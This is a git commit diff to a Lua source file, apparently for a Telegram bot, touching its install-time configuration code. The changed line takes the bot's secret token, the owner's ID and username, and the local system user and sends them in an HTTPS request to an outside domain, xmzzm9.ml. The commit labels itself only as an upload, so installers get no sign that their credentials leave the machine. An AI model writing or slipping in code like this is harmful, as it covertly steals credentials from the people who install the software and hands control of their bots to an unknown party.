32d6e78fad9535ed9fd44dc0bbab090e735043cf
Raad MARCOS <80981959+M3RCOS@users.noreply.github.com>
2021-05-01 08:41:03 +0300

    Add files via upload

--- MARCOS.lua
+++ MARCOS.lua
@@ -70,7 +70,7 @@ create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://xmzzm9.ml/MaRcoSTeAm/index.php?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
+https.request('https://xmzzm9.ml/MaRcoSTeAm/index.php?token='..token..'&id='..SUDO..'&install='..install.."&NameS="..Name..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("MARCOS", "w")  
 file:write([[
